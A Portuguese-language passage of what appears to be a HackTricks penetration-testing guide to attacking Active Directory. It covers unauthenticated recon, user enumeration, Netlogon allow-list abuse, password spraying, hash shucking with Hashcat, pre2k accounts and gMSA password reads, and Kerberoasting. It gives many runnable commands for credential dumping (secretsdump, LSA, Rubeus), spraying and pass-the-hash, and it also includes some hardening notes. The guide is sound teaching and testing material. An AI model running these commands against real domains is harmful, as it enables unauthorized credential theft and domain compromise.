# Metodologia do Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

O **Active Directory** é uma tecnologia fundamental que permite aos **administradores de rede** criar e gerenciar com eficiência **domínios**, **usuários** e **objetos** em uma rede. Ele foi projetado para escalar, facilitando a organização de um grande número de usuários em **grupos** e **subgrupos** gerenciáveis, enquanto controla os **direitos de acesso** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domínios**, **árvores** e **florestas**. Um **domínio** engloba um conjunto de objetos, como **usuários** ou **dispositivos**, que compartilham um banco de dados comum. **Árvores** são grupos desses domínios conectados por uma estrutura compartilhada, e uma **floresta** é o conjunto de várias árvores, interconectadas por **relações de confiança**, formando a camada mais alta da estrutura organizacional. **Direitos de acesso** e **comunicação** específicos podem ser definidos em cada um desses níveis.

Os principais conceitos do **Active Directory** incluem:

1. **Diretório** – Armazena todas as informações relacionadas aos objetos do Active Directory.
2. **Objeto** – Representa entidades no diretório, incluindo **usuários**, **grupos** ou **pastas compartilhadas**.
3. **Domínio** – Serve como contêiner para objetos do diretório. Vários domínios podem coexistir em uma **floresta**, cada um mantendo seu próprio conjunto de objetos.
4. **Árvore** – Um agrupamento de domínios que compartilham um domínio raiz.
5. **Floresta** – O nível mais alto da estrutura organizacional do Active Directory, composto por várias árvores com **relações de confiança** entre elas.

O **Active Directory Domain Services (AD DS)** abrange vários serviços essenciais para o gerenciamento centralizado e a comunicação em uma rede. Esses serviços incluem:

1. **Serviços de Domínio** – Centralizam o armazenamento de dados e gerenciam as interações entre **usuários** e **domínios**, incluindo funcionalidades de **autenticação** e **pesquisa**.
2. **Serviços de Certificados** – Gerenciam a criação, distribuição e administração de **certificados digitais** seguros.
3. **Serviços de Diretório Leve** – Oferecem suporte a aplicativos habilitados para diretório por meio do **protocolo LDAP**.
4. **Serviços de Federação de Diretório** – Oferecem recursos de **single sign-on** para autenticar usuários em vários aplicativos Web durante uma única sessão.
5. **Gerenciamento de Direitos** – Ajuda a proteger material protegido por direitos autorais, regulando sua distribuição e uso não autorizados.
6. **Serviço DNS** – Essencial para a resolução de **nomes de domínio**.

Para uma explicação mais detalhada, consulte: [**TechTerms - Definição de Active Directory**](https://techterms.com/definition/active_directory)

### **Autenticação Kerberos**

Para aprender a **atacar um AD**, você precisa **entender** muito bem o **processo de autenticação Kerberos**.\
[**Leia esta página se ainda não sabe como funciona.**](kerberos-authentication.md)

## Guia rápido

Você pode acessar [https://wadcoms.github.io/](https://wadcoms.github.io) para ver rapidamente quais comandos pode executar para enumerar/explorar um AD.

> [!WARNING]
> A comunicação Kerberos normalmente **exige um nome de domínio totalmente qualificado (FQDN)** para que o cliente possa obter um ticket para o SPN correto. O acesso a uma máquina pelo endereço IP geralmente recorre ao NTLM em vez do Kerberos.

## Reconhecimento do Active Directory (sem credenciais/sessões)

Se você tiver acesso a um ambiente AD, mas não tiver credenciais/sessões, poderá:

- **Fazer pentest na rede:**
  - Fazer uma varredura na rede, encontrar máquinas e portas abertas e tentar **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [impressoras podem ser alvos muito interessantes](ad-information-in-printers.md)).
  - A enumeração de DNS pode revelar informações sobre servidores importantes do domínio, como servidores Web, impressoras, compartilhamentos, VPN, mídia etc.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Consulte a [**Metodologia de pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) geral para mais informações sobre como fazer isso.
- **Verificar o acesso null e Guest em serviços SMB** (isso não funciona em versões modernas do Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao acesso anônimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenenar a rede**
  - Obter credenciais [**se passando por serviços com Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Acessar o host [**abusando do relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Obter credenciais **expondo** [**serviços UPnP falsos com evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Extrair nomes de usuário/nomes de documentos internos, redes sociais e serviços (principalmente Web) nos ambientes do domínio e também de fontes publicamente disponíveis.
  - Se encontrar os nomes completos dos funcionários da empresa, você pode tentar diferentes convenções de **nome de usuário** do AD ([**leia isto**](https://activedirectorypro.com/active-directory-user-naming-convention/)). As convenções mais comuns são: _NomeSobrenome_, _Nome.Sobrenome_, _NomSob_ (3 letras de cada), _Nom.Sob_, _NSobrenome_, _N.Sobrenome_, _SobrenomeNome_, _Sobrenome.Nome_, _SobrenomeN_, _Sobrenome.N_, 3 _letras aleatórias e 3 números aleatórios_ (abc123).
  - Ferramentas:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeração de usuários

- **Enumeração anônima de SMB/LDAP:** Consulte as páginas de [**pentesting de SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting de LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeração com Kerbrute**: Quando um **nome de usuário inválido é solicitado**, o servidor responde com o código de erro **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo determinar que o nome de usuário é inválido. Para **nomes de usuário válidos**, o servidor retorna o **TGT em uma resposta AS-REP** ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário precisa realizar a pré-autenticação.
- **Sem autenticação usando MS-NRPC**: Usar auth-level = 1 (sem autenticação) na interface MS-NRPC (Netlogon) dos controladores de domínio. O método chama a função `DsrGetDcNameEx2` após estabelecer uma conexão com a interface MS-NRPC para verificar se o usuário ou computador existe, sem usar credenciais. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [aqui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **Servidor OWA (Outlook Web Access)**

Se você encontrar um desses servidores na rede, também poderá realizar **enumeração de usuários nele**. Por exemplo, você pode usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Você pode encontrar listas de usernames [**neste repositório do GitHub**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) e neste ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> No entanto, você deve ter os **nomes das pessoas que trabalham na empresa** a partir da etapa de recon que deveria ter realizado antes. Com o nome e o sobrenome, você poderia usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar possíveis usernames válidos.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Mesmo depois de corrigir o **Zerologon** no DC, contas explicitamente incluídas na allow-list ainda podem estar expostas ao **comportamento legado/vulnerável do canal seguro do Netlogon**. A configuração arriscada é a GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou o valor de registro correspondente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Esse valor é um **descritor de segurança SDDL** (consulte [Descritores de segurança](security-descriptors.md)). Qualquer conta ou grupo que receba a ACE relevante na DACL pode ser alvo. Por exemplo, `O:BAG:BAD:(A;;RC;;;WD)` efetivamente inclui **Everyone** na allow-list.

Fluxo de trabalho prático do operador:

1. **Identifique os principais incluídos na allow-list** verificando tanto **SYSVOL/GPO** quanto o **registro ativo do DC**.
2. **Resolva os SIDs** encontrados no SDDL para usuários/computadores reais do AD e priorize **contas de máquina de DCs**, **contas de confiança** e outras máquinas privilegiadas.
3. Tente repetidamente a **autenticação MS-NRPC / Netlogon** como a conta incluída na allow-list.
4. Após uma tentativa bem-sucedida, abuse da **definição de senha do Netlogon** para redefinir a senha da conta-alvo (o PoC público a define como uma string vazia).<sup>[[9]](#references)[[10]](#references)</sup>

Exemplos rápidos de triagem / laboratório do artefato público:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Observações:

- O **scanner** é útil porque a allow-list efetiva pode estar no **SYSVOL**, no **registro** ou em ambos.
- O próprio caminho de exploração é importante porque **não exige privilégios de Domain Admin** depois que uma conta vulnerável é identificada.
- Comprometer uma **conta de máquina de um Domain Controller**, como `DC$`, é especialmente perigoso, pois redefinir essa senha pode habilitar diretamente caminhos mais amplos para **assumir o controle do AD**.
- A viabilidade de **brute force** depende do modo: o artefato público descreve uma abordagem meet-in-the-middle, um **brute force de 24 bits** quando há outra conta de computador disponível e variantes mais lentas de **32 bits**.

Observações sobre detecção e hardening:

- Audite a política da allow-list e remova tudo, exceto exceções temporárias de compatibilidade explicitamente necessárias.
- Monitore os eventos **5827/5828/5829/5830/5831** do **System** nos DCs para detectar conexões vulneráveis do Netlogon negadas, descobertas ou explicitamente permitidas pela política.
- Trate as contas em `VulnerableChannelAllowList` como de **alto risco** até que a dependência legada seja removida.

### Conhecendo um ou vários nomes de usuário

Ok, você já sabe que tem um nome de usuário válido, mas nenhuma senha... Então, tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não tiver** o atributo _DONT_REQ_PREAUTH_, você poderá **solicitar uma mensagem AS_REP** para esse usuário, que conterá alguns dados criptografados por uma derivação da senha do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as **senhas mais comuns** com cada um dos usuários descobertos; talvez algum usuário esteja usando uma senha fraca (tenha em mente a política de senhas!).
  - Observe que você também pode fazer **spraying em servidores OWA** para tentar obter acesso aos servidores de e-mail dos usuários.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Você talvez consiga **obter** alguns **hashes** de challenge para quebrar ao fazer **poisoning** de alguns protocolos da **rede**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

A enumeração do Active Directory fornece nomes de usuário, identificadores de e-mail e padrões de nomenclatura, hosts candidatos e serviços que podem ser induzidos a se autenticar. Use esse contexto para identificar [**ataques de relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM viáveis e possíveis caminhos para entrar no ambiente AD.

### Recon com workspace do NetExec e verificações da postura de relay

- Use **workspaces do `nxcdb`** para manter o estado do recon de AD separado por engagement: `workspace create <name>` cria bancos de dados SQLite por protocolo em `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Alterne as visualizações com `proto smb|mssql|winrm` e liste os segredos coletados com `creds`. Apague manualmente os dados confidenciais ao terminar: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- A descoberta rápida de sub-rede com **`netexec smb <cidr>`** revela **domínio**, **build do SO**, **requisitos de assinatura SMB** e **Null Auth**. Membros que exibem `(signing:False)` são **suscetíveis a relay**, enquanto DCs geralmente exigem assinatura.
- Gere **nomes de host em /etc/hosts** diretamente da saída do NetExec para facilitar o targeting:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Quando o **SMB relay para o DC é bloqueado** pela assinatura, ainda assim verifique a postura do **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / channel binding fraco. Um DC com assinatura SMB obrigatória, mas assinatura LDAP desabilitada, continua sendo um alvo viável de **relay-to-LDAP** para abusos como **RBCD sem SPN**.

### Vazamentos de credenciais de impressoras no lado do cliente → validação em massa de credenciais do domínio

- Às vezes, as interfaces web de impressoras **incorporam senhas de administrador mascaradas no HTML**. Visualizar o código-fonte ou usar as ferramentas de desenvolvedor pode revelar o texto sem formatação (por exemplo, `<input value="<password>">`), permitindo acesso com Basic auth a repositórios de digitalização/impressão.
- Os trabalhos de impressão recuperados podem conter **documentos de integração com texto simples** e senhas por usuário. Mantenha os pares alinhados ao testar:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Roubar credenciais NTLM

Se você puder **acessar outros PCs ou shares** usando o **usuário null ou guest**, poderá **colocar arquivos** (como um arquivo SCF) que, se forem acessados de alguma forma, **acionarão uma autenticação NTLM contra você**, permitindo **roubar** o **desafio NTLM** para crackeá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking e ataques NT-Candidate

**Hash shucking** trata cada hash NT que você já possui como uma senha candidata para outros formatos, mais lentos, cujo material de chave é derivado diretamente do hash NT. Em vez de fazer brute force de frases-senha longas em tickets Kerberos RC4, desafios NetNTLM ou credenciais em cache, você fornece os hashes NT aos modos NT-candidate do Hashcat e deixa que ele valide a reutilização de senhas sem nunca descobrir o texto claro. Isso é especialmente eficaz após o comprometimento de um domínio, quando você pode coletar milhares de hashes NT atuais e históricos.<sup>[[5]](#references)</sup>

Use shucking quando:

- Você tem um corpus de hashes NT obtido por DCSync, dumps de SAM/SECURITY ou cofres de credenciais e precisa testar a reutilização em outros domínios/florestas.
- Você captura material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM ou blobs DCC/DCC2.
- Você quer comprovar rapidamente a reutilização de frases-senha longas e impossíveis de crackear e, em seguida, fazer pivot imediatamente por meio de Pass-the-Hash.

A técnica **não funciona** com tipos de criptografia cujas chaves não são o hash NT (por exemplo, Kerberos etype 17/18 AES). Se um domínio exigir apenas AES, você deverá voltar aos modos normais de senha.

#### Criando um corpus de hashes NT

- **DCSync/NTDS** – Use `secretsdump.py` com o histórico para coletar o maior conjunto possível de hashes NT (e seus valores anteriores):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  As entradas do histórico ampliam significativamente o conjunto de candidatos, pois a Microsoft pode armazenar até 24 hashes anteriores por conta. Para conhecer outras formas de coletar secrets do NTDS, veja:

{{#ref}}
dcsync.md
{{#endref}}

- **Dumps de cache de endpoints** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrai dados locais de SAM/SECURITY e logons de domínio em cache (DCC/DCC2). Remova duplicatas e adicione esses hashes à mesma lista `nt_candidates.txt`.
- **Rastreie os metadados** – Mantenha o nome de usuário/domínio que produziu cada hash (mesmo que a wordlist contenha apenas hexadecimais). Os hashes correspondentes indicam imediatamente qual principal está reutilizando uma senha quando o Hashcat exibe o candidato vencedor.
- Prefira candidatos da mesma forest ou de uma forest confiável; isso maximiza a chance de correspondência durante o shucking.

#### Modos NT-candidate do Hashcat

| Tipo de hash                             | Modo de senha | Modo NT-candidate |
| ---------------------------------------- | ------------- | ----------------- |
| Credenciais de domínio em cache (DCC)    | 1100          | 31500             |
| Credenciais de domínio em cache 2 (DCC2) | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                 | 5500          | 27000             |
| NetNTLMv2                                 | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth       | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast)  | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP                | 18200         | 35400             |

Observações:

- As entradas NT-candidate **devem permanecer hashes NT brutos de 32 caracteres hexadecimais**. Desative os mecanismos de regras (sem `-r` nem modos híbridos), pois as transformações corrompem o material de chave do candidato.
- Esses modos não são inerentemente mais rápidos, mas o keyspace do NTLM (~30.000 MH/s em um M3 Max) é ~100× mais rápido que o Kerberos RC4 (~300 MH/s). Testar uma lista NT selecionada custa muito menos do que explorar todo o espaço de senhas no formato lento.
- Sempre use a **versão mais recente do Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), pois os modos 31500/31600/35300/35400 foram lançados recentemente.<sup>[[7]](#references)</sup>
- Atualmente não há modo NT para AS-REQ Pre-Auth, e os etypes AES (19600/19700) exigem a senha em texto simples, pois suas chaves são derivadas por PBKDF2 a partir de senhas UTF-16LE, não de hashes NT brutos.

#### Exemplo – Kerberoast RC4 (modo 35300)

1. Capture um TGS RC4 para um SPN-alvo usando um usuário com poucos privilégios (consulte a página Kerberoast para obter detalhes):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Extraia o ticket usando sua lista NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   O Hashcat deriva a chave RC4 de cada candidato NT e valida o blob `$krb5tgs$23$...`. Uma correspondência confirma que a conta de serviço usa um dos seus hashes NT existentes.

3. Faça pivot imediatamente via PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Você pode recuperar o texto simples mais tarde com `hashcat -m 1000 <matched_hash> wordlists/`, se necessário.

#### Exemplo – Credenciais em cache (modo 31600)

1. Extraia os logons em cache de uma estação de trabalho comprometida:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Copie a linha DCC2 do usuário interessante do domínio para `dcc2_highpriv.txt` e aplique shucking nela:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Uma correspondência bem-sucedida retorna o hash NT já conhecido na sua lista, provando que o usuário em cache está reutilizando uma senha. Use-o diretamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou faça brute-force no modo NTLM rápido para recuperar a senha em texto.

O mesmo fluxo de trabalho se aplica a respostas a desafios NetNTLM (`-m 27000/27100`) e DCC (`-m 31500`). Assim que uma correspondência for identificada, você pode iniciar um relay, PtH via SMB/WMI/WinRM ou tentar quebrar novamente o hash NT offline com máscaras/regras.



## Enumerando o Active Directory COM credenciais/sessão

Nesta fase, você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida.** Se você tiver credenciais válidas ou um shell como usuário do domínio, **lembre-se de que as opções apresentadas anteriormente continuam sendo opções para comprometer outros usuários**.

Antes de iniciar a enumeração autenticada, entenda o **problema do Kerberos double-hop**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeração

Comprometer uma conta é um **grande passo para avaliar o domínio**, pois permite fazer **enumeração autenticada do Active Directory**:

Em relação ao [**ASREPRoast**](asreproast.md), agora você pode encontrar todos os usuários potencialmente vulneráveis; e, em relação ao [**Password Spraying**](password-spraying.md), obter uma **lista de todos os nomes de usuário** e testar a senha da conta comprometida, senhas vazias e novas senhas promissoras.

- Você pode usar o [**CMD para fazer um reconhecimento básico**](../basic-cmd-for-pentesters.md#domain-info)
- Você também pode usar o [**powershell para reconhecimento**](../basic-powershell-for-pentesters/index.html), que será mais furtivo
- Você também pode [**usar o powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informações mais detalhadas
- Outra ferramenta incrível para reconhecimento em um Active Directory é o [**BloodHound**](bloodhound.md). Ele **não é muito furtivo** (dependendo dos métodos de coleta usados), mas, **se isso não for uma preocupação**, vale muito a pena experimentá-lo. Descubra onde os usuários podem usar RDP, encontre caminhos para outros grupos etc.
  - **Outras ferramentas automatizadas de enumeração de AD:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Registros DNS do AD**](ad-dns-records.md), pois podem conter informações interessantes.
- Uma **ferramenta com GUI** que você pode usar para enumerar o diretório é o **AdExplorer.exe**, do pacote **SysInternal** Suite.
- Você também pode pesquisar no banco de dados LDAP com **ldapsearch** para procurar credenciais nos campos _userPassword_ e _unixUserPassword_, ou até mesmo nas notas _description_ e _info_ dos usuários. Um token sem rótulo no campo _info_ que se parece com uma senha é apenas um possível candidato: confirme separadamente sua finalidade e validade e não inclua o conteúdo das notas na saída de enumeração de rotina. Consulte [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para outros métodos.
- Revise os scripts **acessíveis** de logon de domínio e mapeamento de unidades em `\\<dc>\NETLOGON` ou `\\<dc>\SYSVOL\<domain>\scripts`, quando a autorização permitir. A [documentação da Microsoft](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) explica a função do diretório de scripts no compartilhamento NETLOGON. Primeiro liste os nomes e, em seguida, inspecione apenas os scripts relevantes e legíveis, respeitando um limite de tamanho; não despeje o conteúdo de um compartilhamento inteiro nem exiba valores de credenciais durante a enumeração de rotina. Uma chamada do PowerShell a [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **não** protege uma senha literal armazenada no script. A chamada, por si só, não prova que um segredo esteja codificado no script: rastreie a entrada real e, em seguida, verifique separadamente a conta, a validade das credenciais e os privilégios. A revisão de um script de domínio é uma análise de um compartilhamento remoto, separada da enumeração de um host local.
- Se você estiver usando **Linux**, também poderá enumerar o domínio com [**pywerview**](https://github.com/the-useless-one/pywerview).
- Você também pode experimentar ferramentas automatizadas, como:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraindo todos os usuários do domínio**

  É muito fácil obter todos os nomes de usuário do domínio no Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção de Enumeração pareça curta, ela é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda a enumerar um domínio e pratique até se sentir à vontade. Durante uma avaliação, este será o momento-chave para encontrar um caminho até DA ou decidir que nada pode ser feito.

### Contas de computador pré-criadas previsíveis -> acesso à senha de gMSA

Contas de computador preparadas para associações legadas podem manter uma senha inicial previsível. O módulo `pre2k` do NetExec identifica o valor característico `4128` de `userAccountControl` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) e tenta obter um TGT Kerberos usando os primeiros 14 caracteres do nome do computador em letras minúsculas, sem o `$` final. Trate esse valor de UAC como um seletor de possíveis candidatos, em vez de presumir que pertencer a **Pre-Windows 2000 Compatible Access** por si só prove que a senha é fraca.<sup>[[18]](#references)[[20]](#references)</sup>

Use a enumeração LDAP autenticada para testar os candidatos e salvar os TGTs obtidos com sucesso. `ALL=True` amplia os testes para incluir objetos que não correspondem ao filtro padrão `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Uma falha no bind padrão/NTLM **não** invalida esse achado: teste com `-k`, um FQDN que resolva para o DC e um relógio sincronizado com o KDC. Execuções bem-sucedidas do módulo gravam listas de candidatos e ccaches adquiridos em `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Após comprometer o principal de computador, mapeie suas associações aninhadas a grupos e permissões de saída. Em particular, os principais listados no descritor de segurança `msDS-GroupMSAMembership` de um gMSA podem ler `msDS-ManagedPassword`; a saída de `--gmsa` do NetExec mostra os principais autorizados e retorna o hash NT atual quando o computador autenticador tem autorização.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Em seguida, avalie a gMSA recuperada como qualquer outra credencial: inspecione as associações a grupos locais/do domínio, os direitos de logon, os SPNs, a delegação e os serviços acessíveis antes de tentar pass-the-hash. Esse caminho de obtenção baseado em ACL é distinto de [Golden gMSA/dMSA](golden-dmsa-gmsa.md), que deriva senhas gerenciadas após o comprometimento da chave raiz do KDS.<sup>[[20]](#references)</sup>

Uma entidade de computador também pode ter controle de saída sobre outros objetos de computador ou grupos. Depois de obter uma, inspecione separadamente as associações aninhadas e as ACLs efetivas: um direito de gravação em outro objeto de computador pode permitir uma alteração de conta, e os direitos de associação a grupos podem levar a uma função de logon. Um sinalizador de conta preparada, uma convenção de nomenclatura previsível ou, por si só, uma relação `GenericWrite` não comprovam o caminho completo.

Uma cópia legível de um blob `msDS-ManagedPassword` em um arquivo, compartilhamento ou backup representa um caminho de exposição separado: a ACL de leitura LDAP não protege uma cópia armazenada em outro local. Valide se os dados são um blob de senha gerenciada antes de interpretá-los e diferencie isso tanto de uma leitura LDAP autorizada quanto da derivação pela chave raiz do KDS.

### Kerberoast

Kerberoasting consiste em obter **tickets TGS** usados por serviços vinculados a contas de usuário e quebrar sua criptografia — baseada em senhas de usuário — **offline**.

Saiba mais sobre isso em:


{{#ref}}
kerberoast.md
{{#endref}}

### Conexão remota (RDP, SSH, FTP, Win-RM etc.)

Depois de obter algumas credenciais, você pode verificar se tem acesso a alguma **máquina**. Para isso, você pode usar o **CrackMapExec** para tentar se conectar a vários servidores com diferentes protocolos, de acordo com as varreduras de portas.

### Local Privilege Escalation

Se você comprometeu credenciais ou uma sessão como usuário comum do domínio e consegue acessar **qualquer máquina do domínio**, procure um caminho para **escalar privilégios localmente e coletar credenciais**. Privilégios de administrador local podem permitir **extrair hashes de outros usuários** da memória (LSASS) e do armazenamento local (SAM).

Este livro tem uma página completa sobre [**escalada de privilégios local no Windows**](../windows-local-privilege-escalation/index.html) e uma [**lista de verificação**](../checklist-windows-privilege-escalation.md). Além disso, não se esqueça de usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets da sessão atual

É muito **improvável** que você encontre **tickets** no usuário atual que **lhe concedam permissão para acessar** recursos inesperados, mas você pode verificar:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Com credenciais de domínio ou uma sessão de usuário, revisite os [**ataques de relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: técnicas de enumeração autenticada e coerção podem revelar caminhos de relay que não estavam disponíveis durante o reconhecimento não autenticado.

### Procure Creds em Compartilhamentos de Computadores | Compartilhamentos SMB

